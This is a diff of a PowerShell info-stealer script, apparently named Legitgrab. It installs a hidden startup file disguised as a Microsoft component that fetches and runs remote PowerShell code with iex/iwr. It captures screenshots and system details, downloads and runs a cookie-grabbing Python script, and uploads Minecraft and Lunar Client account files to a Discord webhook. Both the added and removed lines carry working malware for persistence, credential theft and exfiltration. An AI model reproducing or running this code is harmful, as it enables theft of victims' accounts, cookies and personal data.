@@ -17,13 +17,10 @@ attrib +h "C:\windows\temp\Win.microsoft.Security.temp"
 cls
 #####################################################################
 
-
 #####################################################################
-
 Set-Content "C:\Users\$env:UserName\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft.Privacy.FullKeys.Priv.cmd" "
 @echo off
-powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/gr.ps1).content)
-"
+powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/gr.ps1).content)"
 attrib +h "C:\Users\$env:USERNAME\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\Microsoft.Privacy.FullKeys.Priv.cmd"
 cls
 #####################################################################
@@ -43,8 +40,7 @@ $bitmap = New-Object System.Drawing.Bitmap $Width, $Height
 $graphic = [System.Drawing.Graphics]::FromImage($bitmap)
 $graphic.CopyFromScreen($Left, $Top, 0, 0, $bitmap.Size)
 $bitmap.Save($File) 
-######################################################################
-
+#####################################################################
 
 #####################################################################
 function Upload-Discord {
@@ -70,15 +66,12 @@ if (-not ([string]::IsNullOrEmpty($file))){curl.exe -F "file1=@$file" $webHookUr
 }
 ######################################################################
 
-
 ######################################################################
 [System.Collections.ArrayList]$embedArray = @()
 $thumbUrl = 'https://cdn.discordapp.com/attachments/1055506901812650034/1064993265549590608/image.png' 
 #https://streamsentials.com/wp-content/uploads/2022/06/EZ-transparent-png.png
 $thumbnailObject = [PSCustomObject]@{
-	
     url = $thumbUrl
-	
 }
 $color = '12517376'
 $title = 'Info of '
@@ -88,39 +81,24 @@ CPU: ' + '`' + $CPU + '`' + '
 RAM: ' + '`' + $ram + '`' + '
 HWID: ' + '`' + $hwid + '`' + '
 Discord: '
-
 $embedObject = [PSCustomObject]@{
     color = $color
     title = $title + '`' + $env:UserName + '`'
     description = $description 
     thumbnail = $thumbnailObject
 }
-
 $embedArray.Add($embedObject)
-$payload = [PSCustomObject]@{
-	
-    embeds = $embedArray
-	
+$payload = [PSCustomObject]@{	
+    embeds = $embedArray	
 }
-
 ######################################################################
 
-#powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/UUID.ps1).content)
-#Useless now
-
-
-
-Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/Cookies.py" -OutFile "C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys.txt" 
+######################################################################
+Invoke-WebRequest -Uri "https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/asset/Cookies.py" -OutFile "C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys.txt" 
 (Get-Content C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys.txt) -replace 'hook = "WillBeReplaceBiUrWebHook"', $Hook | Set-Content C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys_Crypted.py
-#For grab all cookies
-
-#powershell -windowstyle hidden $webHookUrl2=$webHookUrlPYTHON3;iex((iwr https://raw.githubusercontent.com/Appolon24800/Legitgrab-POWERSHELL/main/UUID_utils.ps1).content)
-#For idk lol
-#Soon ?
-
 ######################################################################
 
-
+######################################################################
 Upload-Discord -text "||@everyone||"
 powershell -windowstyle hidden C:\Windows\Temp\Win.microsoft.Security.temp\UUID_gen.py
 Start-Sleep -Seconds 3
@@ -130,9 +108,5 @@ Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -M
 Start-Sleep -Seconds 2
 Upload-Discord -file "C:\Users\$env:UserName\.lunarclient\settings\game\accounts.json"
 Upload-Discord -file "C:\Users\$env:username\AppData\Roaming\.minecraft\cheatbreaker_accounts.json"
-#powershell -windowstyle hidden C:\Windows\Temp\Win.microsoft.Security.temp\UUID_utils.py
 python C:\windows\temp\Win.microsoft.Security.temp\SecurityKeys_Crypted.py
-
 ######################################################################
-
-
